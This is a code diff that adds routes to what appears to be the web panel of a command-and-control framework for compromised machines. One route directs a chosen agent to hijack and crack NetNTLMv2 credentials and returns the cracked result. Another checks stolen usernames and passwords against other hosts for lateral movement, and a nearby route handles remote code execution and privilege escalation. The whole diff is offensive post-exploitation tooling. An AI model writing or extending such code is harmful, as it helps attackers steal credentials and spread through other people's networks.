@@ -290,6 +290,48 @@ def execute_driver():
             window.location.href = document.referrer;
         </script>"""
 
+@blueprint.route('/NetNTLMHijack',methods=["POST"])
+def NetNTLMHijack():
+    arg = request.form.to_dict()
+    if arg != {}:
+        agent = arg['selected_ntlm_agent']
+        operation = arg['wordlist_operation']
+        client_id = db.execute('SELECT identifier FROM all_agnets WHERE id=?',agent).fetchone()
+        client_id = str(client_id[0])
+
+        try:
+            with connections_lock:
+                if connections != []:
+                    for conn in connections:
+                        if conn[6] == client_id:
+                            operation_tested = ''
+                            result = NetNTLMv2_Hijack(conn,operation)
+                            if result == False:
+                                return "NTLM Cannot be cracked"
+                            return f"NTLM Cracked: {result}"
+        except OSError:
+            time.sleep(5)
+    else:
+        return """
+        <script>
+            window.alert("No Agent Selected");
+            window.location.href = document.referrer;
+        </script>"""
+
+@blueprint.route('/lateral_movement',methods=["POST"])
+def lateral_movement():
+    arg = request.form.to_dict()
+    if arg != {}:
+        ipaddress = arg['ip_address']
+        username = arg['username']
+        password = arg['password']
+        # no active agents required.
+        output = lateral_movement_check(ipaddress,username,password)
+        if output: # might need to change the output of these things
+            return 'OK!'
+        else:
+            return 'Wrong password'
+
 @blueprint.route("/rce_privesc", methods=["POST"])
 def rce_privesc():
     arg = request.form.to_dict()
